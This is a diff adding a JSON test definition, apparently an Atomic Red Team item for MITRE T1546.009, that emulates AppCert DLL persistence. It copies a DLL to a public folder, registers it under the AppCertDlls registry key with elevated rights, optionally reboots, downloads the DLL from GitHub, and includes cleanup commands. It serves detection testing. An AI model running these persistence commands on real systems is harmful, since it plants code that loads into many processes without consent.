@@ -1,0 +1,44 @@
+{
+    "name": "Create registry persistence via AppCert DLL",
+    "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key.  Once the computer restarted, the DLL will be loaded in multiple processes and write an  'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.  Reference: https://skanthak.homepage.t-online.de/appcert.html ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n",
+        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f\nRemove-Item C:\\Users\\Public\\AtomicTest.dll -Force\nRemove-Item C:\\Users\\Public\\AtomicTest.txt -Force\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1546.009",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "AppCert DLLs",
+    "source": "ART",
+    "uuid": "a5ad6104-5bab-4c43-b295-b4c44c7c6b05",
+    "arguments": {
+        "dll_path": {
+            "description": "path of dll to use",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll"
+        },
+        "reboot": {
+            "description": "Set value to $true if you want to automatically reboot the machine",
+            "type": "string",
+            "default": "$false"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "File to copy must exist on disk at specified location (#{dll_path})\n",
+            "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll\" -OutFile \"#{dll_path}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
